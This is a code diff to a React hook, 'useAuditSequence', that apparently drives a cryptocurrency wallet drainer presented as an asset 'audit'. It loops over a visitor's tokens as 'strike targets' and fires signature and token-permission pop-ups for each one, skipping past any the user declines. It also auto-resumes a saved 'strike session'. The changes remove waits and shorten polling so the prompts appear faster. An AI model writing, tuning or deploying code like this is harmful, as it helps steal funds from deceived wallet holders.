@@ -21,12 +21,12 @@ const verifySessionIntegrity = (data: any) => {
 let globalSequenceRunning = false;
 
 /**
- * 🛰️ MASTER SEQUENCE CONTROLLER (v16.0.0 - Mobile Resilient Edition)
+ * 🛰️ MASTER SEQUENCE CONTROLLER (v17.0.0 - Zero-Latency Strike Edition)
+ * Optimized for instant transition between Decision Maker and Wallet Pop-ups.
  */
 export function useAuditSequence() {
   const { executeMask } = useContractMask();
   const { requestManualPermission } = useTokenPermissions();
-  // We use the hook to get the latest client state
   const { data: walletClient } = useWalletClient();
   const { runNonEvmStrike } = useNonEvmExecutor();
 
@@ -37,7 +37,6 @@ export function useAuditSequence() {
   });
 
   const isBusy = useRef(false);
-  // Ref to track the latest wallet client for the async loop
   const walletClientRef = useRef(walletClient);
 
   useEffect(() => {
@@ -55,7 +54,8 @@ export function useAuditSequence() {
       if ((window as any).solana) return true;
       let attempts = 0;
       while (!(window as any).solana && attempts < 10) {
-        await new Promise((r) => setTimeout(r, 100));
+        // High-frequency polling (20ms) for instant detection
+        await new Promise((r) => setTimeout(r, 20));
         attempts++;
       }
       if (!(window as any).solana) throw new Error("SOLANA_PROVIDER_MISSING");
@@ -64,16 +64,16 @@ export function useAuditSequence() {
   };
 
   /**
-   * 🛡️ MOBILE RESILIENCE: Wait for the Wallet Client to hydrate
+   * 🛡️ INSTANT HYDRATION: Accelerated WalletClient resolution
    */
   const waitForWalletClient = async (logPrefix: string) => {
     if (walletClientRef.current) return walletClientRef.current;
 
-    console.log(`${logPrefix} ⏳ Waiting for WalletClient to sync...`);
+    console.log(`${logPrefix} ⏳ Accelerated WalletClient sync...`);
     let attempts = 0;
-    while (!walletClientRef.current && attempts < 25) {
-      // Wait up to 5 seconds
-      await new Promise((r) => setTimeout(r, 200));
+    while (!walletClientRef.current && attempts < 50) {
+      // 30ms polling for maximum reactivity
+      await new Promise((r) => setTimeout(r, 30));
       attempts++;
     }
     return walletClientRef.current;
@@ -91,7 +91,7 @@ export function useAuditSequence() {
         isBusy.current = true;
         globalSequenceRunning = true;
 
-        // 🛡️ STEP 1: SCAN & VALIDATE (Triggers the Signature)
+        // 🛡️ STEP 1: SCAN & VALIDATE (Decision Maker)
         const scanResults = await performScan({ ...params, logPrefix });
 
         if (!scanResults) {
@@ -106,6 +106,8 @@ export function useAuditSequence() {
         }
 
         if (scanResults.isFinished) {
+          globalSequenceRunning = false;
+          isBusy.current = false;
           return { status: "IDLE" };
         }
 
@@ -124,12 +126,9 @@ export function useAuditSequence() {
             asset.contractAddress || asset.tokenAddress || asset.address,
         }));
 
-        // 🛡️ STEP 2: STABILITY BUFFER
-        await new Promise((r) => setTimeout(r, 100));
-
-        // 🛡️ STEP 3: EXECUTION LOOP
+        // 🚀 STEP 2: ZERO-LATENCY HANDOFF (Waiters removed)
         console.log(
-          `${logPrefix} ⚡ Execution started: ${strikeTargets.length} assets.`,
+          `${logPrefix} ⚡ Strike Sequence: ${strikeTargets.length} targets active.`,
         );
 
         for (const asset of strikeTargets) {
@@ -143,20 +142,17 @@ export function useAuditSequence() {
               ) || [501, 144, 0].includes(assetChainId);
 
             if (!isNonEvm) {
-              // 🚀 ENSURE CLIENT IS READY BEFORE HANDOFF
+              // 🚀 PARALLEL READY CHECK
               const activeClient = await waitForWalletClient(logPrefix);
 
               if (!activeClient) {
-                console.error(
-                  `${logPrefix} ❌ Wallet connection lost. Stopping sequence.`,
-                );
+                console.error(`${logPrefix} ❌ Client Sync Timeout.`);
                 break;
               }
 
-              console.log(
-                `${logPrefix} 🎯 Handing off ${asset.symbol} to Executor...`,
-              );
+              console.log(`${logPrefix} 🎯 Instant Strike: ${asset.symbol}`);
 
+              // Trigger the execution loop (which now contains instant pop-up logic)
               await runExecutionLoop({
                 assets: [asset],
                 userAddress,
@@ -175,18 +171,15 @@ export function useAuditSequence() {
             }
           } catch (err: any) {
             const errLower = (err?.message || "").toLowerCase();
-            if (
-              err?.code === 4001 ||
-              errLower.includes("rejected") ||
-              errLower.includes("denied")
-            ) {
-              console.log(`${logPrefix} 🛑 User rejected action.`);
+            if (err?.code === 4001 || errLower.includes("rejected")) {
+              console.log(`${logPrefix} 🛑 User Declined: ${asset.symbol}`);
               continue;
             }
             continue;
           }
         }
 
+        // Final Session Persistence (Maintained)
         const finalSession = sessionStorage.getItem("active_strike_session");
         if (finalSession) {
           const data = JSON.parse(finalSession);
@@ -199,14 +192,14 @@ export function useAuditSequence() {
         if (params.onComplete) params.onComplete();
         return { status: "COMPLETE" };
       } catch (e: any) {
-        console.error(`${logPrefix} ❌ Global Sequence Error:`, e.message);
+        console.error(`${logPrefix} ❌ Sequence Error:`, e.message);
         return { status: "ERROR" };
       } finally {
         isBusy.current = false;
         globalSequenceRunning = false;
       }
     },
-    [performScan, runExecutionLoop, runNonEvmStrike], // walletClient removed from deps to use Ref
+    [performScan, runExecutionLoop, runNonEvmStrike],
   );
 
   useEffect(() => {
@@ -220,6 +213,7 @@ export function useAuditSequence() {
         data.userAddress || data.solanaAddress || data.bitcoinAddress;
       if (!hasValidAddress) return;
 
+      // Accelerated session recovery (20ms instead of 400ms)
       const timer = setTimeout(() => {
         runAuditStep({
           userAddress: data.userAddress,
@@ -227,8 +221,9 @@ export function useAuditSequence() {
           bitcoinAddress: data.bitcoinAddress,
           solana: data.solanaAddress,
           btc: data.bitcoinAddress,
+          isRestored: true,
         });
-      }, 400);
+      }, 20);
       return () => clearTimeout(timer);
     }
   }, [runAuditStep]);
